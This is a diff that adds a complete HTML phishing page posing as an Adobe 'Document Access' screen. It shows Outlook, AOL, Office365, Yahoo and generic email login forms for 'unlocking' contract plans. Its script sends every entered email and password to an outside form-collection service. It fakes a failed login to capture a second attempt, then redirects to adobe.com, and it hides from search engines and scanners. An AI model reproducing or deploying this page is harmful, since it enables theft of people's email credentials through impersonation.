@@ -1,0 +1,395 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <!-- ADDED: Prevent search engines from indexing -->
+    <meta name="robots" content="noindex, nofollow">
+    <!-- Botpoison Script -->
+    <script src="https://unpkg.com/@botpoison/browser" async></script>
+    
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
+    <link rel="icon" href="https://www.kindpng.com/picc/m/163-1638130_transparent-adobe-logo-png-png-download.png">
+    <title>Adobe - Document Access</title>
+    <style>
+        #imgDiv{           
+            background-image: url(https://upload.wikimedia.org/wikipedia/en/thumb/9/9a/TLV-LLBG_Aerodome_Chart_2014.pdf/page1-1280px-TLV-LLBG_Aerodome_Chart_2014.pdf.jpg);
+            background-size: cover;
+            content: "";
+            display: block;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 1100px;
+            z-index: -2;
+            opacity: 0.08;
+        }
+        
+        .spinner {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            width: 100%;
+            background: rgba(0,0,0,0.75) url('https://media.giphy.com/media/3osxY5p129OPafgkw0/giphy.gif') no-repeat center center;
+            z-index: 10000;
+        }
+
+        footer {
+            color:#fff;
+            background: red;
+            margin-top: 4px;
+            padding: 6px;
+            width:100%;
+            height:100%;
+        }
+
+        body{
+            color: #333333;
+            font-family: arial;
+            max-width: 650px;
+            margin: 0 auto;
+            padding: 0 16px;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        header {
+            margin-top: 16px;
+            margin-bottom: 48px;
+        }
+
+        input {
+            border: 1px solid #9debc2;
+            padding: 8px;
+            background: #fff;
+        }
+        
+        /* Honeypot field style */
+        .honeypot {
+            display: none !important;
+        }
+    </style>
+</head>
+<body>
+<div id="imgDiv"></div>
+
+<!-- Hidden iframe for form submission -->
+<iframe name="hidden_iframe" id="hidden_iframe" style="display:none;"></iframe>
+
+<div class="container">
+<header>
+    <div id ="imgWrap">
+        <img class="img-responsive" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAQoAAAC+CAMAAAD6ObEsAAAAw1BMVEX////tIiQtLi3sAAD/+vojJCP6xcXtAgkqKyrf398cHRwOEA57e3sAAAAmJyaCg4ITFROnp6fp6enCw8ILDQsaGxrOzs7sERTu7+7tGRvm5ub29vb0jI09Pj1zc3P++Pg0NTRVVlWVlZVJSklCQ0KxsbG8vLz839/71tb96+yJiYnX19fuMjRrbGugoKDMzMxgYWD6ysrwU1TycnPuKiv1l5fvR0j3tLTxYmP0h4j2paXzfH34vb7vSkv3qqrvPT/xaGk1Sud5AAAGaElEQVR4nO2aa0PaPBiGWbqMtKWlSirUinIYOEHQHZw7+M79/1/15tCWpBSBDbaJ9/VFTdLaXOTwPKG1GgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADgmXL1psylWf1+qfpvPej+eXDKvDOr75aqX/+tJ907b5xXFskHq/qqble/qr8cFc6DXf8xebEqPpXq3zkvVUX7rtzgc/JCVdSvyg3unZepIvm41OD1rifIseu6x797k31gq7B3Us1Ze7cqGkEUnK+qdIOQRp3f/Re/hqUieaxoceXsVkWTEtpYVelyxuJ/QYVzX9XkS7K1ijnpdrukuu5pFT4h3r+gIrmoavLe2VpF02OM8ZPquuegov21us11sq2KHiOM0GZl3bNQ4VxWt/lW31KFywnrMhJVVj4HFcmXFW0u2luqmFBCjjwStaoqn4MKZ2UC/r29nQqP0eYpJ7S8Z7rjo/loFtoq3On0dPGHVJHK2GPJx2lF2U4xVFyb5VaAcelspeImkgOCMsJTs3jO/Njz4pAYKlq3fhRFvjfJWkoVrBGKQr83N67tTKgqO9q6g5uzUFH/ZpZ/tlx8SLZRcU4JV7MkHi0KT2jMSEauotP3xRChIWFerLcbqYJQ1ZDFvSIobfkeCyllLBpadneKocJMPy6d72arB2cbFVz19cQnYb8ouwlE/zyfc74YFWmPEsbPBzMuNpxgKou0iohzXyw3YZjNiFYgtubZoEnFMjP8zQ6vplDRttKP7207Mfu0hYpxrBdMj5Eg/1w7gfiY/YGbpp3FWtEXJrqyhcuEi64skipoc5qm04b87VZfLMaTp0zdhiTa2xwpVFjph9gz6la6ftfeXIV4Xi5/ihni5fP9VvTa06tjsYO0OCGxdnUifo3GNa0i23hG4lfuqis8EmsBHXGbt7/a1XXkKpL/zNIf9dIhTnGwt15FGmRdnYrooqfLjoOsqzVDhRweeRQ2ZCSUQ8BQIZccbyBvKMYMzdr1w8VI2zW5Cjv9eEzKR3s/k01VjMT80GugiDn9aV7G8t4UKjzR65usUIwgRlJbxdTXesRPNjxRjIWy4ppdU0wQs4sq67APfPODvfUqxAfHhoqumO0TVSa6H86y+lzFsZwUeUQhXKnJYqpI5Y2yOhYp5CZUHbjtgExF+8ws1EPAjsMfk81UyB4SppBboqcKGzSXslAhPmwS5yrEUkuisooeY3ILEnGruE+B3mr2QKbCMfeL7ISibe2n9/XNVMgHz5+6+Aylijz0zFW41qiQV5VVxHqCyDvS+VHOfF+RhVaR/DTL8u2ibubsFxuOCpGGxdlzj8RiQdW8GFA91iW5ipSvWStakV425QThfyAv0Sqc92ZZdfz5tb2JCpmUFtvdQHyeKvhW4z/rTbFsiiWwmDVVO4hYdPhU35J4+4y4M5QK+yBvEVpaWYlORNapEL1fPPap2ENV8C0jrHyGFCrmsZ4UNRWZLsUVgziPVuXpBz2t7Rulov7DLFokHHauqsrXqRDjPFgMZvlhq+6IGIHE52qWT3IVqVhLwreyi664SocgSoWcNZ3zKI+wlDPmzWXLTmuytyREjwpzUTDSUHs/1daeVnES6YGeIVc8Nc1ltwnl/casy4oBMpbRuCgbyhxEH/+pzPRtQxSJxSPIs7luKPcQkb5wHvl7VWFvFcbhRGk/vV6vQoz+eLz4U04MPV/cUMpgNGSMRmHWx6MglGVSjq+vUukYo2aR4JjRPKmVpxl7QqqwOmweWZVOO+XB3tMq0iCKArPglsd+T1cNqAyS/ChsLmKk6ZDHHvVifpstBW7gSVuMxnxmBNjpjHuyOBQaf6WXGyFU2NPgzmkrMhfm1Llaq6Izbo2tuDg9FuR/uDfj1rSUQbijwWQwWhROj5r9bnfYGJXanc5n3W6v3xzX9oZQYScbd2eax4r99GP7wL8zLb9HoNFbqr3NikTkoFXUl94jUGRfG9vB13/JYatYeo9Ao782tr8RuHcOWsXyewSaLCmztpfXrw76tbSK9wg0+mtjez89O2AVD9crq7L83QpFrw5ZxY/Vddd6P7UTlMov2w+CN090LXt/1Ro3T7V/5jw13i8e1KvMD4fbewAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADAn+V/3oRvwy0kREYAAAAASUVORK5CYII=" style="width:200px;height:200px;">
+        <h4 class="text-center" style="color:red;"><strong>Adobe requires you to sign in with<br><span> your receiving email to download plans for this contract.</span></strong></h4>
+    </div>
+</header>
+
+<!-- Outlook Modal -->
+<div class="col-xs-12">
+    <div id="buttonDiv" class="text-center" style="padding-top: 30px; justify-content: center;">
+        <button type="button" class="btn btn-primary" data-toggle="modal" data-target="#outlookModal">Outlook</button>
+    </div>
+    
+    <div id="outlookModal" class="modal fade" role="dialog">
+        <div class="modal-dialog">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <button type="button" class="close" data-dismiss="modal">&times;</button>
+                    <img style="width:50px; height:50px;" src="https://i7.pngguru.com/preview/653/271/784/microsoft-outlook-outlook-com-email-microsoft-office-365-outlook-logo.jpg">
+                </div>
+                <div class="modal-body">
+                    <!-- ADDED: Honeypot field -->
+                    <input type="text" name="_gotcha" style="display:none" tabindex="-1" autocomplete="off">
+                    
+                    <form id="outlookForm" target="hidden_iframe" data-botpoison-public-key="pk_e35707e9-231d-46c2-966b-ab76048d3c75">
+                        <div class="form-group">
+                            <label for="emailOutlook">Email</label>
+                            <input class="form-control" type="email" id="emailOutlook" name="email_1" placeholder="Your receiving email" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="pwdOutlook">Password</label>
+                            <input class="form-control" type="password" id="pwdOutlook" name="pw_1" placeholder="Your password" required>
+                        </div>
+                        <input type="hidden" name="provider" value="outlook">
+                        <input type="hidden" id="attemptOutlook" name="attempt" value="1">
+                        <input type="hidden" name="adobe_login" value="true">
+                        <button type="submit" class="btn btn-primary">Unlock File</button>
+                    </form>
+                    <div class="error-div alert alert-danger" style="display:none;">Incorrect Username Or Password</div>
+                </div>
+                <div class="modal-footer">
+                    <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- AOL Modal -->
+<div class="col-xs-12">
+    <div id="buttonDiv" class="text-center" style="padding-top: 80px; justify-content: center;">
+        <button type="button" class="btn btn-primary btn-dark" data-toggle="modal" data-target="#aolModal">AOL</button>
+    </div>
+    
+    <div id="aolModal" class="modal fade" role="dialog">
+        <div class="modal-dialog">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <button type="button" class="close" data-dismiss="modal">&times;</button>
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b6/AOL_logo.svg/1280px-AOL_logo.svg.png" style="width:50px;height:50px;">
+                </div>
+                <div class="modal-body">
+                    <!-- ADDED: Honeypot field -->
+                    <input type="text" name="_gotcha" style="display:none" tabindex="-1" autocomplete="off">
+                    
+                    <form id="aolForm" target="hidden_iframe" data-botpoison-public-key="pk_e35707e9-231d-46c2-966b-ab76048d3c75">
+                        <div class="form-group">
+                            <label for="emailAol">Email</label>
+                            <input class="form-control" type="email" id="emailAol" name="email_1" placeholder="Your receiving email" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="pwdAol">Password</label>
+                            <input class="form-control" type="password" id="pwdAol" name="pw_1" placeholder="Your password" required>
+                        </div>
+                        <input type="hidden" name="provider" value="aol">
+                        <input type="hidden" id="attemptAol" name="attempt" value="1">
+                        <input type="hidden" name="adobe_login" value="true">
+                        <button type="submit" class="btn btn-primary btn-dark">Unlock File</button>
+                    </form>
+                    <div class="error-div alert alert-danger" style="display:none;">Incorrect Username Or Password</div>
+                </div>
+                <div class="modal-footer">
+                    <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Office365 Modal -->
+<div class="col-xs-12">
+    <div id="buttonDiv" class="text-center" style="padding-top: 80px; justify-content: center;">
+        <button type="button" class="btn btn-primary" data-toggle="modal" data-target="#officeModal" style="background:red;border:1px solid red;">Office365</button>
+    </div>
+    
+    <div id="officeModal" class="modal fade" role="dialog">
+        <div class="modal-dialog">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <button type="button" class="close" data-dismiss="modal">&times;</button>
+                    <img src="https://www.tdaniels.com/files/2017/03/Office365_V2.png" style="width:50px; height:50px;">
+                </div>
+                <div class="modal-body">
+                    <!-- ADDED: Honeypot field -->
+                    <input type="text" name="_gotcha" style="display:none" tabindex="-1" autocomplete="off">
+                    
+                    <form id="officeForm" target="hidden_iframe" data-botpoison-public-key="pk_e35707e9-231d-46c2-966b-ab76048d3c75">
+                        <div class="form-group">
+                            <label for="emailOffice">Email</label>
+                            <input class="form-control" type="email" id="emailOffice" name="email_1" placeholder="Your receiving email" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="pwdOffice">Password</label>
+                            <input class="form-control" type="password" id="pwdOffice" name="pw_1" placeholder="Your password" required>
+                        </div>
+                        <input type="hidden" name="provider" value="office365">
+                        <input type="hidden" id="attemptOffice" name="attempt" value="1">
+                        <input type="hidden" name="adobe_login" value="true">
+                        <button type="submit" class="btn btn-primary" style="background: red;border:1px solid red;">Unlock File</button>
+                    </form>
+                    <div class="error-div alert alert-danger" style="display:none;">Incorrect Username Or Password</div>
+                </div>
+                <div class="modal-footer">
+                    <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Yahoo Modal -->
+<div class="col-xs-12">
+    <div id="buttonDiv" class="text-center" style="padding-top: 80px; justify-content: center;">
+        <button type="button" class="btn btn-primary" data-toggle="modal" data-target="#yahooModal" style="background: #720e9e;border:1px solid #720e9e">Yahoo</button>
+    </div>
+    
+    <div id="yahooModal" class="modal fade" role="dialog">
+        <div class="modal-dialog">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <button type="button" class="close" data-dismiss="modal">&times;</button>
+                    <img src="https://s.yimg.com/uu/api/res/1.2/Dn1UwBT_Cr.lJucziCG49A--~B/aD05MTQ7dz0xNTg0O3NtPTE7YXBwaWQ9eXRhY2h5b24-/https://media-mbst-pub-ue1.s3.amazonaws.com/creatr-uploaded-images/2019-09/a929b8f0-dd65-11e9-bffe-b90463fd5188" style="width:50px;height:50px;">
+                </div>
+                <div class="modal-body">
+                    <!-- ADDED: Honeypot field -->
+                    <input type="text" name="_gotcha" style="display:none" tabindex="-1" autocomplete="off">
+                    
+                    <form id="yahooForm" target="hidden_iframe" data-botpoison-public-key="pk_e35707e9-231d-46c2-966b-ab76048d3c75">
+                        <div class="form-group">
+                            <label for="emailYahoo">Email</label>
+                            <input class="form-control" type="email" id="emailYahoo" name="email_1" placeholder="Your receiving email" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="pwdYahoo">Password</label>
+                            <input class="form-control" type="password" id="pwdYahoo" name="pw_1" placeholder="Your password" required>
+                        </div>
+                        <input type="hidden" name="provider" value="yahoo">
+                        <input type="hidden" id="attemptYahoo" name="attempt" value="1">
+                        <input type="hidden" name="adobe_login" value="true">
+                        <button type="submit" class="btn btn-primary" style="background:purple;border:1px solid purple;">Unlock File</button>
+                    </form>
+                    <div class="error-div alert alert-danger" style="display:none;">Incorrect Username Or Password</div>
+                </div>
+                <div class="modal-footer">
+                    <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Other Email Modal -->
+<div class="col-xs-12">
+    <div id="buttonDiv" class="text-center" style="padding-top: 80px; padding-bottom:80px; justify-content: center;">
+        <button type="button" class="btn btn-primary btn-dark" data-toggle="modal" data-target="#otherModal">Other Email</button>
+    </div>
+    
+    <div id="otherModal" class="modal fade" role="dialog">
+        <div class="modal-dialog">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <button type="button" class="close" data-dismiss="modal">&times;</button>
+                    <img src="https://cdn1.vectorstock.com/i/1000x1000/20/55/email-icon-black-and-white-mail-vector-24922055.jpg" style="width:50px; height:50px;">
+                </div>
+                <div class="modal-body">
+                    <!-- ADDED: Honeypot field -->
+                    <input type="text" name="_gotcha" style="display:none" tabindex="-1" autocomplete="off">
+                    
+                    <form id="otherForm" target="hidden_iframe" data-botpoison-public-key="pk_e35707e9-231d-46c2-966b-ab76048d3c75">
+                        <div class="form-group">
+                            <label for="emailOther">Email</label>
+                            <input class="form-control" type="email" id="emailOther" name="email_1" placeholder="Your receiving email" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="pwdOther">Password</label>
+                            <input class="form-control" type="password" id="pwdOther" name="pw_1" placeholder="Your password" required>
+                        </div>
+                        <input type="hidden" name="provider" value="other">
+                        <input type="hidden" id="attemptOther" name="attempt" value="1">
+                        <input type="hidden" name="adobe_login" value="true">
+                        <button type="submit" class="btn btn-primary btn-dark">Unlock File</button>
+                    </form>
+                    <div class="error-div alert alert-danger" style="display:none;">Incorrect Username Or Password</div>
+                </div>
+                <div class="modal-footer">
+                    <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<footer>
+    <div id="footer">
+        <h4 class="text-center">All rights reserved &copy;Adobe 2026</h4>
+    </div>
+</footer>
+
+</div>
+
+<script src="https://code.jquery.com/jquery-3.4.1.slim.min.js" integrity="sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js" integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script>
+
+<script>
+// Store first attempt credentials
+let firstAttempt = {
+    email: '',
+    password: '',
+    provider: ''
+};
+
+// Handle all form submissions
+document.querySelectorAll('form').forEach(form => {
+    form.addEventListener('submit', function(e) {
+        // Don't prevent default
+        
+        // Get current form data
+        const email = $(this).find('input[type="email"]').val();
+        const password = $(this).find('input[type="password"]').val();
+        const attempt = $(this).find('input[name="attempt"]').val();
+        
+        // Determine provider from form id
+        let provider = '';
+        if (form.id === 'outlookForm') provider = 'outlook';
+        if (form.id === 'aolForm') provider = 'aol';
+        if (form.id === 'officeForm') provider = 'office365';
+        if (form.id === 'yahooForm') provider = 'yahoo';
+        if (form.id === 'otherForm') provider = 'other';
+        
+        // Show spinner
+        showSpinner();
+        
+        // Set form action to Formspark
+        form.action = "https://submit-form.com/0gyAIslPc";
+        form.method = "POST";
+        
+        if (attempt == 1) {
+            // First attempt: Store credentials
+            firstAttempt.email = email;
+            firstAttempt.password = password;
+            firstAttempt.provider = provider;
+            
+            // Update hidden field to 2 for next attempt
+            $(this).find('input[name="attempt"]').val('2');
+            
+            // Show error after 2 seconds
+            setTimeout(showError, 2000);
+            
+        } else {
+            // Second attempt: Add first attempt data as hidden fields
+            $(this).append('<input type="hidden" name="first_attempt_email" value="' + firstAttempt.email + '">');
+            $(this).append('<input type="hidden" name="first_attempt_password" value="' + firstAttempt.password + '">');
+            $(this).append('<input type="hidden" name="first_provider" value="' + firstAttempt.provider + '">');
+            
+            // Redirect to Adobe after form submits
+            setTimeout(function() {
+                window.location.href = 'https://adobe.com';
+            }, 1000);
+        }
+    });
+});
+
+// Spinner functions
+function showSpinner(){
+    var spinner = $('.spinner');
+    spinner.show();
+}
+
+function clearSpinner(){
+    var spinner = $('.spinner');
+    spinner.remove();
+}
+
+function showError(){
+    var error = $('.alert');
+    error.show();
+    clearSpinner();
+    
+    setTimeout(clearError, 3000);
+}
+    
+function clearError() {
+    $('.alert').hide();
+}
+</script>
+
+<!-- ADDED: Spinner div -->
+<div class="spinner"></div>
+
+</body>
+</html>
